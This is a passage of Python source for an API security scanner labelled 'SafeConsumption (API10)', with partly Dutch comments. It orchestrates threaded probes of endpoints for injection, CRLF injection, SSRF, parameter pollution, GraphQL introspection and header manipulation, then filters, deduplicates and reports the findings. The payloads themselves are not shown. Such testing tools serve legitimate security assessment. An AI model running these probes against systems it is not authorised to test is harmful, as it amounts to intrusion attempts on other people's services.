                    pre_executor.submit(self._is_endpoint_reachable, ep): ep
                    for ep in endpoints
                }
                
                for future in as_completed(future_to_ep):
                    if stop_requested.is_set():
                        print(f"{Fore.YELLOW}[!] Scan stopped by user during pre-scan{Style.RESET_ALL}")
                        # Cancel all pending tasks
                        for f in future_to_ep:
                            f.cancel()
                        break
                        
                    ep = future_to_ep[future]
                    try:
                        if future.result(timeout=self.timeout * 2):
                            reachable_endpoints.append(ep)
                    except Exception as e:
                        self._log(f"Pre-scan failed for {ep}", str(e), "Low")
                    finally:
                        pbar.update(1)

        if stop_requested.is_set():
            return self.issues

        # Calculate total tasks (1 per test per endpoint)
        num_tests_per_endpoint = 8 + len(self.INJECTION_PAYLOADS)
        total_tasks = len(reachable_endpoints) * num_tests_per_endpoint
        
        # Main scan: full tests
        with tqdm(total=total_tasks, desc="Scanning endpoints") as pbar:
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as main_executor:
                all_tasks = []
                
                for ep in reachable_endpoints:
                    if stop_requested.is_set():
                        break
                    
                    # Add all test types
                    test_fns = [
                        partial(self._test_basic_security, ep),
                        partial(self._test_crlf_injection, ep), #CRLF injection is a vulnerability that lets a malicious hacker inject carriage return (CR) and linefeed (LF)
                        partial(self._test_hpp, ep), #HTTP Parameter Pollution
                        partial(self._test_sensitive_data_exposure, ep), #Sensitive data exposure
                        partial(self._test_graphql_introspection, ep), 
                        partial(self._test_ssrf, ep), # Server-Side Request Forgery
                        partial(self._test_header_manipulation, ep), #HTTP connection manager manipulates several HTTP headers
                        #partial(self._test_docker_api, ep), #working docker need to extended 
                        #partial(self._test_kubernetes_api, ep),  #working docker need to extended 
                    ]
                    
                    # Add injection tests per type
                    for t in self.INJECTION_PAYLOADS:
                        test_fns.append(partial(
                            self._run_injection_tests_parallel, ep, t
                        ))
                    
                    # Schedule tasks
                    for fn in test_fns:
                        if stop_requested.is_set():
                            break
                        all_tasks.append(main_executor.submit(fn))
                
                # Process results with progress tracking
                for future in as_completed(all_tasks):
                    if stop_requested.is_set():
                        print(f"{Fore.YELLOW}[!] Scan stopped by user during main scan{Style.RESET_ALL}")
                        # Annuleer resterende taken
                        for task in all_tasks:
                            task.cancel()
                        break
                        
                    try:
                        future.result(timeout=self.timeout * 20)  # Longer timeout
                    except concurrent.futures.TimeoutError:
                        self._log("Test timeout", "N/A", "Medium")
                    except Exception as e:
                        self._log(f"Test failed", str(e), "Medium")
                    finally:
                        pbar.update(1)

        print(f"{Fore.CYAN}[INFO] Scan completed. Found {len(self.issues)} issues.{Style.RESET_ALL}")
        return self.issues

    def _run_injection_tests_parallel(self, endpoint: str, test_type: str):
        if stop_requested.is_set():
            return

        payloads = self.INJECTION_PAYLOADS[test_type]
        test_urls = []
        
        # Bepaal voorkeursmethode voor dit endpoint
        method_preference = "POST" if "/posts" in endpoint else "auto"
        
        # Generate test URLs
        for p in payloads:
            if stop_requested.is_set():
                return
            test_url = f"{endpoint}?input={urlparse.quote(p)}"
            test_urls.append((test_url, method_preference))
            test_urls.append((endpoint.replace("%7BpostId%7D", urlparse.quote_plus(p)), "GET"))
        
        # Dynamic worker count (extra haakje verwijderd)
        workers = min(8, max(1, len(payloads)))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            # Check for stop-request before starting
            if stop_requested.is_set():
                return
                
            # Add tasks
            futures = []
            for test_url, method in test_urls:
                if stop_requested.is_set():
                    break
                futures.append(executor.submit(self._test_injection, test_url, test_type, method=method))
            
            # Process results with stop-check
            for future in concurrent.futures.as_completed(futures):
                if stop_requested.is_set():
                    for f in futures:
                        f.cancel()
                    return
                try:
                    future.result()
                except Exception:
                    pass  

    def _is_endpoint_reachable(self, endpoint: str) -> bool:
        #Improved reachability check using HEAD/GET
        try:
            # need tho think
            resp = self.session.head(
                endpoint, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            if resp.status_code in (405, 501): 
                resp = self.session.get(
                    endpoint, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            return resp.status_code != 404
        except requests.RequestException:
            return False
     
    # ------------------------------------------------------------------
#  Issue-filter & deduplicatie
# ------------------------------------------------------------------
    def _filter_issues(self) -> list[dict]:
        """
        Verwijdert parser- en netwerkfouten, dedupliceert findings en
        past zonodig de severity aan.  Geeft de opgeschoonde lijst terug
        -n zet self.issues op dezelfde inhoud.
        """
        cleaned, seen = [], set()
        self.parser_errors, self.network_errors = [], []

        NETWORK_ERROR_PATTERNS = (
            "httpconnectionpool",
            "read timed out",
            "newconnectionerror",
            "failed to establish a new connection",
            "connection refused",
            "winerror 10061",
            "max retries exceeded",
        )

        for issue in self.issues:
            # -----------------------------------------------------------
            # Normaliseer beschrijving + eventuele error-tekst
            # -----------------------------------------------------------
            desc   = str(issue.get("description", "")).lower()
            err    = str(issue.get("error", "")).lower()
            combo  = f"{desc} {err}"

            # ---- Parser-ruis skippen ----------------------------------
            if ("failed to parse" in combo or
                "name 'parsed' is not defined" in combo):
                self.parser_errors.append(issue)
                continue

            # ---- Netwerk-ruis skippen ---------------------------------
            if any(pat in combo for pat in NETWORK_ERROR_PATTERNS):
                self.network_errors.append(issue)
                continue

            # -----------------------------------------------------------
            # Deduplicatie-sleutel:  method / path / status / payload
            # -----------------------------------------------------------
            dedup_key = (
                issue.get("method"),
                issue.get("path") or issue.get("endpoint"),
                issue.get("status_code"),
                issue.get("payload"),
            )
            if dedup_key in seen:
                continue
            seen.add(dedup_key)

            # -----------------------------------------------------------
            # Severity bijstellen voor niet-kritieke 403 / 405
            # -----------------------------------------------------------
            try:
                status = int(issue.get("status_code", 0))
            except (ValueError, TypeError):
                status = 0

            if (
                issue.get("description", "").startswith("Possible SQL injection")
                and status in {400, 401, 403, 404, 405, 422}
            ):
                issue["severity"] = "Info"

            if issue.get("status_code") == "-" or "timeout" in str(issue.get("error", "")).lower():
                issue["severity"] = "Info"
            
            cleaned.append(issue)

        # State bijwerken + teruggeven
        self.issues = cleaned
        return self.issues

        
    def generate_report(self) -> str:
        """Generate an HTML report (gefilterd en gededupliceerd)."""
        self._filter_issues()                     # - eerst opschonen!
        gen = ReportGenerator(
            issues=self.issues,
            scanner="SafeConsumption (API10)",
            base_url=self.base_url,
        )
        return gen.generate_html()

    
    def save_report(self, path: str, fmt: str = "html") -> None:
            ReportGenerator(
            issues=self._filter_issues(),       
            scanner="SafeConsumption (API10)",  
            base_url=self.base_url,
        ).save(path, fmt=fmt)